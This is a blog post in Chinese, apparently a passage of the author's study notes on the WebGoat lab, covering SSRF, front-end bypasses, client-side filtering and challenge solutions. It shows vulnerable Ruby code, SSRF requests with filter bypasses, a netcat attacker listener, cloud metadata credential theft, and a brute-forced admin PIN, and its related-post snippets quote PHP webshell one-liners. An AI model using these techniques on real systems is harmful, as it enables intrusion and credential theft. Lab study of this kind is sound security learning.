+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Server-Side Request Forgery</p>
+<p>攻击者可以利用这种攻击来滥用服务器上的功能<br>从而读取或更新内部资源<br>具体为：</p>
+<ul>
+<li>读取服务器配置（如AWS元数据）</li>
+<li>连接到内部服务（如启用HTTP的数据库）</li>
+<li>对不打算暴露的内部服务执行POST请求</li>
+</ul>
+<p>通过提供或修改在服务器上运行的URL或代码</p>
+<hr>
+<p>下面内容来自拓展阅读：<a target="_blank" rel="noopener" href="https://www.hackerone.com/application-security/how-server-side-request-forgery-ssrf">How To: Server-Side Request Forgery (SSRF)</a></p>
+<p>一种让服务器执行攻击者请求的攻击手段<br>发生在Web应用请求外部或其他服务器上的资源的时候</p>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>假设有这么一台服务器server.rb<br>在本地端口4567上运行着如下的Ruby代码：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;open-uri&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">    format <span class="string">&#x27;RESPONSE: %s&#x27;</span>, open(params[<span class="symbol">:url</span>]).read</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>这段代码千万不要对外，因为会导致RCE</strong></p>
+<p>如果有人发送如下请求：<br><a target="_blank" rel="noopener" href="http://localhost:4567/?url=https://google.com">http://localhost:4567/?url=https://google.com</a><br>那么open()调用将会获取<a target="_blank" rel="noopener" href="https://google.com,并且会把响应返回到客户端/">https://google.com，并且会把响应返回到客户端</a></p>
+<blockquote>
+<p>Fetching a URL from the internet isn’t that exciting and not a vulnerability by itself – since it’s directly connected the internet, anyone can access it anyway.</p>
+</blockquote>
+<p>现假设有如下网络环境：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211018092649946.png" alt="image-20211018092649946"></p>
+<ul>
+<li>web-server.com运行着上述Ruby代码</li>
+<li>admin-panel在80端口上开放一个<strong>无身份验证</strong>的站点</li>
+<li>router提供NAT服务</li>
+<li>内外网间没有防火墙或任何安全规则</li>
+<li>外网仅能访问web-server.com，admin-panel不对外网开放</li>
+</ul>
+<h3 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h3><p>攻击者在外网，向web-server.com发送如下请求：<br><a target="_blank" rel="noopener" href="http://web-server.com:4567/?url%5C=http://10.0.0.2/">http://web-server.com:4567/?url\=http://10.0.0.2/</a><br>那么web-server.com就会请求仅内网访问的admin-panel<br>并把请求结果返回给在外网的攻击者</p>
+<p>这时候的web-server.com就好像一个<strong>“代理”</strong><br>成为了攻击者访问内网资源的一个代理<br>使攻击者可以让任意数据在内外网之间双向流动</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>假设自己准备了一台攻击者的服务器hack-box-1（外网IP：1.2.3.4）<br>在上面使用netcat监听自己所有接口上的8080端口：<br><code>hack-box-1 $ nc -l -n -vv -p 8080 -k</code></p>
+<p>然后攻击者向web-server.com发送如下请求：<br><code>curl http://web-server.com:4567/\?url\=http://1.2.3.4:8080/</code><br>攻击者就会发现服务器上netcat收到了下面的请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hack-box-1 $ nc -l -n -vv -p 8080 -k</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8080)</span><br><span class="line">Connection from [masked] port 8080 [tcp/*] accepted (family 2, sport 45982)</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Ruby</span><br><span class="line">Host: 1.2.3.4:8080</span><br></pre></td></tr></table></figure>
+
+<p>说明上面的HTTP请求会被发送到参数url所指示的地址&#x2F;域名</p>
+<p>如果恶意服务器响应如下请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Location: http://10.0.0.2/</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+
+<p>那么web-server.com将会跟从这个重定向，并向<a target="_blank" rel="noopener" href="http://10.0.0.2/%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82">http://10.0.0.2/发送请求</a></p>
+<p>提及重定向<br>是因为一些公司为了缓解SSRF，会限制对内网资源或端口的访问<br>但是重定向这一块经常没有被考虑到<br>就好比如上面的Ruby代码中只加上了如下的限制：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  url = <span class="variable constant_">URI</span>.parse params[<span class="symbol">:url</span>]</span><br><span class="line">  halt <span class="number">403</span> <span class="keyword">if</span> url.host =~ <span class="regexp">/\A10\.0\.0\.\d+\z/</span></span><br><span class="line">  format <span class="string">&#x27;RESPONSE: %s&#x27;</span>, open(params[<span class="symbol">:url</span>]).read</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>是可以被上面的<strong>重定向响应方法绕过</strong>的<br>（<strong>whitelists better than blacklists</strong>）<br>而且还有其他的绕过方法：</p>
+<ul>
+<li>使用十进制IP表示法<a target="_blank" rel="noopener" href="http://10.0.0.2/%E4%BB%A3%E6%9B%BFhttp://10.0.0.2/">http://167772162/代替http://10.0.0.2/</a></li>
+<li>创建一个指向10.0.0.2的DNS A记录<br>并使用自己的域名来访问10.0.0.2</li>
+</ul>
+<p>而且<strong>重定向</strong>这种方法很多时候可以<strong>绕过端口、主机、路径或者是协议限制</strong></p>
+<p>如果使用白名单检测，则效果会好很多：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  url = <span class="variable constant_">URI</span>.parse params[<span class="symbol">:url</span>]</span><br><span class="line">  halt <span class="number">403</span> <span class="keyword">unless</span> url.host == <span class="string">&#x27;web-server.com&#x27;</span></span><br><span class="line">  format <span class="string">&#x27;RESPONSE: %s&#x27;</span>, open(params[<span class="symbol">:url</span>]).read</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="容易出现SSRF漏洞的5个特征"><a href="#容易出现SSRF漏洞的5个特征" class="headerlink" title="容易出现SSRF漏洞的5个特征"></a>容易出现SSRF漏洞的5个特征</h3><ul>
+<li><strong>Webhooks</strong>：<em>（一种由服务端主动向客户端推送的范式，类似于C&#x2F;S架构的逆转）</em>寻找那些当确切事件发生时会发送HTTP请求的服务，大多数Webhooks场景下终端用户可以选择他们自己的endpoint和hostname</li>
+<li><strong>PDF生成器</strong>：尝试注入&lt;iframe&gt;、&lt;img&gt;、&lt;base&gt;或者是&lt;script&gt;元素，或者是注入CSS url()函数，去指向内部服务</li>
+<li><strong>文档解析器</strong>：试着去挖掘文档是怎样被解析的。例如如果是XML文档，则使用PDF生成器的方法；如果是其他文档，就看看有没有方法去引用外部资源并对内部资源进行访问</li>
+<li><strong>链接扩展</strong>：？？<a target="_blank" rel="noopener" href="https://twitter.com/BugBountyHQ/status/868242771617792000">链接在这里（Twitter）</a></li>
+<li><strong>文件上传</strong>：不正常上传文件，尝试上传一个URL，看看服务器能否下载到URL对应的内容。</li>
+</ul>
+<hr>
+<p>关于上面那个“文件上传”的特点，看了下<a target="_blank" rel="noopener" href="https://hackerone.com/reports/713">那份报告</a><br>大概是在一个论坛上传用户头像的地方<br>通过修改前端HTML元素，<strong>更改上传类型“file”为“url”</strong><br><strong>然后粘贴图片URL到上传框</strong><br>再进行上传，发现可以上传指定的外部图片<br>说明服务器对外部资源进行了请求，存在SSRF风险</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/change_to_url.png" alt="change_to_url"></p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/upload_from_url.png" alt="upload_from_url"></p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/profile_photo_changed.png" alt="profile_photo_changed"></p>
+<p>然后就在14年奖了500刀<br><del>哇操</del></p>
+<h3 id="blind-SSRF"><a href="#blind-SSRF" class="headerlink" title="blind SSRF"></a>blind SSRF</h3><p>之前的举的例子，是因为没有对内网环境执行任何防火墙规则<br>因此攻击者完全可以“正常合法地”获取内网信息、资源和服务</p>
+<p>但是有些时候SSRF并不会返回响应给攻击者<br>这种情况称之为，或者就需要用到<strong>盲SSRF</strong></p>
+<p>如下Ruby代码：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;open-uri&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="string">&#x27;done&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>该例子下攻击者无论请求什么url参数，只要请求成功，服务器都只会返回“done”<br>这时候的影响通常仅局限于内网服务挖掘和端口扫描等（统称内网探测）<br>因为可以从返回的错误信息中判断对应的服务或端口是否开启<br>（或者是请求被过滤）</p>
+<h3 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h3><p><strong>暴露内网&#x2F;被防火墙保护的系统</strong></p>
+<p><strong>技巧</strong>：<br>比较响应时间是辨别内部路由有哪些网段的一个好方法<br>因为一般不在路由表中的网段会很快被路由器丢弃（导致快响应）<br>而应用内部防火墙规则的网段通常会导致RTT（往返时延）增加（导致慢响应）<br>另外路由器和交换机通常会开启HTTP或者是SSH接口，所以优先尝试.1和.254地址的22、80、443、8080和8443端口通常是值得的</p>
+<p><strong>服务挖掘和端口扫描</strong></p>
+<p>方便暴露内部结构以及挖掘其他漏洞</p>
+<p>一些请求和对应响应的例子（从返回码和RTT来综合分析）：</p>
+<img src="image-20211018114247267.png" alt="image-20211018114247267" style="zoom:67%;" />
+
+<p><strong>提取EC2配置文件</strong></p>
+<p>涉及到一个叫Amazon EC2的概念<br>大概是一种在云端计算机运行各种计算或应用的服务（云计算、云服务？）</p>
+<p>Amazon公开了一个可以让所有EC2实例查询主机元数据实体的内部服务<br>如果发现了一个运行在EC2上的SSRF漏洞<br>就可以尝试请求<a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data/">http://169.254.169.254/latest/meta-data/</a><br>这会返回很多关于站点结构的信息<br>甚至是一些Amazon S3访问token、API token等</p>
+<p>可以引申到现如今的其他云服务系统？<br>获取一般云服务系统的元数据？</p>
+<h3 id="把SSRF作为一个支点"><a href="#把SSRF作为一个支点" class="headerlink" title="把SSRF作为一个支点"></a>把SSRF作为一个支点</h3><p>并不是所有SSRF都使用HTTP协议</p>
+<p>有使用可以利用SSRF达到RCE的效果<br>一个例子是：<br>可以通过推送异步任务到一个<strong>未授权的</strong>Redis服务的一个队列中<br>然后利用一个使用gopher:&#x2F;&#x2F; protocol的应用来执行命令</p>
+<p>总之，SSRF通常作为挖掘和进一步利用其他漏洞的一个跳板，并造成更大的危害</p>
+<hr>
+<p>下面回到WebGoat</p>
+<h3 id="第一道题目-2"><a href="#第一道题目-2" class="headerlink" title="第一道题目"></a>第一道题目</h3><p>好像很简单，直接抓包<br>发现url参数请求的是tom.png<br>改成jerry.png，搞定了</p>
+<h3 id="第二道题目-2"><a href="#第二道题目-2" class="headerlink" title="第二道题目"></a>第二道题目</h3><p>根据提示改url参数为<a target="_blank" rel="noopener" href="http://ifconfig.pro,搞大定/">http://ifconfig.pro，搞大定</a></p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
+<li>对服务器能获取的资源，从域名、来源以及协议等方面列一个白名单</li>
+<li>对于任何用户输入都应该进行验证，并拒绝所有不符合预期的请求</li>
+<li>尽可能地不让用户控制某些<strong>服务器请求资源的函数</strong>的输入</li>
+</ul>
+<h2 id="前端限制绕过"><a href="#前端限制绕过" class="headerlink" title="前端限制绕过"></a>前端限制绕过</h2><p>用户对前端有着较大得控制权<br>可以修改HTML或者是脚本代码<br>因此对于特定格式的输入，也应该在后端进行校验</p>
+<hr>
+<p><strong>第一道题目</strong></p>
+<p>各种绕过前端限制<br>下拉选择菜单改选择项<br>单选框改复选框（checkbox）<br>checkbox改输入框（text）<br>修改输入长度限制<br>去掉“只读”属性</p>
+<hr>
+<p><strong>第二道题目</strong></p>
+<p>JS脚本作正则限制<br>很多主流浏览器不允许在运行时修改脚本<br>因此可以考虑先发送正常输入<br>通过前端脚本检查后<br>再抓包修改，再放包<br>搞定</p>
+<h2 id="Client-Side-Filtering"><a href="#Client-Side-Filtering" class="headerlink" title="Client Side Filtering"></a>Client Side Filtering</h2><p>应该总是只发送给用户他们有权限查看的信息<br>而不发送额外的不必要的信息<br>防止越权、信息泄露等问题</p>
+<hr>
+<p><strong>第一道题目</strong></p>
+<p>场景是，越权查看CEO的薪资<br>一个选择菜单，查看元素，发现是通过value参数传入员工ID<br>于是递增员工ID，发现爆出了CEO的信息</p>
+<hr>
+<p><strong>第二道题目</strong></p>
+<p>一个商品购买页面<br>提示是知道code就不用付钱了</p>
+<p>很奇怪，我怎么知道有这个接口能够返回所有code？<br>&#x2F;WebGoat&#x2F;clientSideFiltering&#x2F;challenge-store&#x2F;coupons&#x2F;</p>
+<h2 id="HTML篡改"><a href="#HTML篡改" class="headerlink" title="HTML篡改"></a>HTML篡改</h2><p>题目是，买电视<br>要我以低价买多台电视</p>
+<p>看看源码，发现前端有JS脚本做验证</p>
+<p>抓包，改，过，无语</p>
+<p>防御方法是，后端再从数据库中获取数据来重新计算价格，再对比验证</p>
+<p>另外也有关于<a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#goals-of-input-validation">输入验证的OWASP备忘录</a></p>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><p>WebGoat CTF<br>不对要做什么进行解释<br>也没有任何提示</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211019105433086.png" alt="image-20211019105433086"></p>
+<h3 id="admin-lost-password"><a href="#admin-lost-password" class="headerlink" title="admin lost password"></a>admin lost password</h3><p>登陆题目，优先考虑SQLi？<br>结果连sqlmap level5 risk3都搞不定<br>（起码知道了这种级别的sqlmap探测需要起码半小时以上。。。。）</p>
+<p>那只能试试爆破？</p>
+<p>发现网络上流传的答案都不太行<br>看了看源码，发现判断条件里有个奇怪的东西<br><code>PASSWORD.replace(&quot;1234&quot;, String.format(&quot;%04d&quot;,ImageServlet.PINCODE)).equals(password);</code><br>意思貌似是吧固定密码的‘1234’字段给替换成了别的东西</p>
+<p>找到PASSWORD为<br>!!webgoat_admin_1234!!<br>再看看怎么做替换</p>
+<p>再看看这个PINCODE的定义：<br><code>static final public int PINCODE = new SecureRandom().nextInt(10000);</code><br>似乎只能0-10000之间的数字了<br>其中要求最少4位，不足左边用0填充</p>
+<p>生成字典（木头字典工具），开搞<br>等，开🐟</p>
+<p>然后扫到7000多的时候终于出来了，感动</p>
+<hr>
+<p>后续</p>
+<p>看了看别人的做法，结果说登录框上面那张logo图片有乾坤？？？<br>WTF</p>
+<p>弄下来，文本打开，发现还真是</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211019205342341.png" alt="image-20211019205342341"></p>
+<p>麻麻子，这谁想得到啊<br>可能是模拟一些笨比管理员把自己密码放在藏在一个公开地方备忘？</p>
+<h3 id="without-password"><a href="#without-password" class="headerlink" title="without password"></a>without password</h3><p>又是登录框，只不过这次变成是登录<del>疗愈师</del>Larry</p>
+<p>很普通的SQLi，单引号字符型</p>
+<h3 id="admin-password-reset"><a href="#admin-password-reset" class="headerlink" title="admin password reset"></a>admin password reset</h3><p>尝试帮admin重置密码</p>
+<p>把密码重置邮件发送到攻击者邮箱，点击链接，提示说我不是admin<br>然后看看请求包，感觉唯一辨识身份的就只有那个维持登录态的cookie<br>估计方向是获取密码重置链接后面的那串token</p>
+<p>去看看源码<del>（呃，痛苦）</del><br>？？？结果admin的重置链接token直接就给我了？</p>
+<hr>
+<p>看看别人的做法，说这种是属于<strong>git泄露</strong></p>
+<p>访问这个链接：<br><a target="_blank" rel="noopener" href="http://www.webgoat.local:8080/WebGoat/challenge/7/.git">www.webgoat.local:8080/WebGoat/challenge/7/.git</a><br>可以下载到这个题目的git源码（how do i fucking know?）</p>
+<p>解压后，在.git所在的那个目录查看下git状态，发现删除了一些文件：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211019205939406.png" alt="image-20211019205939406"></p>
+<p>git log看看提交记录：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211019210333627.png" alt="image-20211019210333627"></p>
+<p>试试退回到上一个版本（箭头指向）<br>执行<code>git reset --hard ac937c7</code>（后面tab补全）<br>然后发现目录下多了那些原来删除的文件</p>
+<p>然后就是考虑反编译下PasswordResetLink.class这个文件<br>（听说burp打开就可以直接反编译？？）<br>就可以看到admin重置密码链接token的生成方式</p>
+<blockquote>
+<p>这里生成link时使用了random.setSeed()，而这个就直接导致了本题的漏洞，设置了种子过后生成的就是伪随机数，就是说同一个种子每次生成的随机数是固定的，所以我们这里只需要把PasswordResetLink.class与MD5.class的代码拷贝到一个新项目里，然后运行代码就可以得到admin重置密码的链接了（记得运行代码的时候得指定程序的第一个参数为admin,否则会提示没有指定用户名）</p>
+</blockquote>
+<hr>
+<p>我的收获是：</p>
+<ul>
+<li>知道了一种新的题型&#x2F;安全问题：<strong>git泄露</strong></li>
+<li>知道了<strong>git的一些功能和操作方法</strong></li>
+<li>知道了**.class文件可以反编译成java源码**（&#x3D;&#x3D;还没实操&#x3D;&#x3D;）</li>
+</ul>
+<h3 id="without-account"><a href="#without-account" class="headerlink" title="without account"></a>without account</h3><p>不会，看源码，发现限制了请求方法不能为GET</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211019212406311.png" alt="image-20211019212406311"></p>
+<p>然后了解到了如下信息：</p>
+<blockquote>
+<p><strong>HEAD方法跟GET方法相同，只不过服务器响应时不会返回消息体。</strong></p>
+<p><strong>一个HEAD请求的响应中，HTTP头中包含的元信息应该和一个GET请求的响应消息相同。这种方法可以用来获取请求中隐含的元信息，而不用传输实体本身。</strong></p>
+<p>也经常用来测试超链接的有效性、可用性和最近的修改。一个HEAD请求的响应可被缓存，也就是说，响应中的信息可能用来更新之前缓存的实体。如果当前实体跟缓存实体的阈值不同（可通过Content-Length、Content-MD5、ETag或Last-Modified的变化来表明），那么这个缓存就被视为过期了。</p>
+</blockquote>
+<p>所以GET改HEAD，成了（新知识get）</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>学到很多东西，比较贴合现代企业对于Web安全的防御要求</p>
+<p>好评</p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/post-cover/default.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<!-- <div>分享</div> -->
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+			<a href="/2021/10/17/OWASP-Cross-Site-Request-Forgery-CSRF/" title="OWASP Cross Site Request Forgery (CSRF)" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">
+								Web靶场-upload-labs			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								环境攻击机：kali 10.10.10.128靶机：Debian 11.1 x64 
+Pass-01任务：上传一个webshell到服务器
+直接怼，显示：
+
+改成basic.jpg，点击上传后bp抓包，修改后缀为.php，上传成功了：...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-upload-labs"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
+								PHP-Web渗透中常见的高危函数以及伪协议			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								代码执行函数eval
+代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
+利用：http://10.10.10.3/test.php?cmd=phpinfo();
+assert
+代码：&lt;?...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">
+								Webshell流量分析			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 1日, 2023				
+							</p>
+							<p class="relate-post-content">
+								菜刀一句话在这里：&lt;?php eval($_POST[&#39;myhack&#39;]) ?&gt;
+用的某个工具包里的菜刀，流量如下：
+
+agent有火狐5.0以及百度
+连接密码开头，用了array_map封装命令执行函数，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/oiiai.jpg" alt="Webshell流量分析"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">
+								sqli-labs Stacked Injections			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 30日, 2023				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] sqli-labs Stacked Injections前言针对sqli-labs靶场的做题笔记
+环境虚拟机环境攻击机：kali | 10.10.10.1靶机：Debian 11.1 | 10.10.10.3 | Apa...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Stacked Injections"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">
+								Web靶场-DSVW			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 25日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] DSVW靶场练习笔记前言是针对DSVW靶场的练习笔记是在搞完Pikachu靶场之后在整理vulnstack的Web安全入门进阶靶场时发现的里面版本比较老，就单独搞出来玩玩
+最新版本v0.2b用Python 3运行代码很顶...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-DSVW"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">
+								Web靶场-Pikachu			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 6日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Pikachu靶场练习笔记前言是针对Pikachu靶场的练习笔记是在搞完WebGoat之后想着再找一个靶场玩玩
+环境攻击者：Kali Linux | 10.10.10.1靶机：Ubuntu | 10.10.10.2 | ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Pikachu"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">
+								一些BurpSuite进阶使用			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 10日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Burp Suite进阶前言目前只是些平时练习过程中接触到的BP进阶使用方法和技巧
+后续再考虑找些专门的教程学学
+使用宏抓取页面token下面以抓取pikachu靶场爆破模块的token为例
+来自于g0tmi1k的文章
+...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/burpsuite.png" alt="一些BurpSuite进阶使用"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">
+								SQL与sqlmap			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								一月 13日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] SQL与sqlmapSQL语法order by
+
+对查询结果排序
+ASC：升序（默认）、DESC：降序
+SQL注入中多在成功查询之后添加order by i来猜解回显的字段数
+如XXX/?id=1&#39; order ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="SQL与sqlmap"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/12/18/sqli-labs-Adv-Injections/" title="sqli-labs Adv Injections">
+								sqli-labs Adv Injections			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十二月 18日, 2021				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] sqli-labs Adv Injections前言针对sqli-labs靶场的做题笔记
+环境虚拟机环境攻击机：kali|10.10.10.1靶机：ubuntu|10.10.10.2|Apache+PHP+MySQL
+L...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/12/18/sqli-labs-Adv-Injections/" title="sqli-labs Adv Injections">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Adv Injections"/>
+							</a>
+						</div>
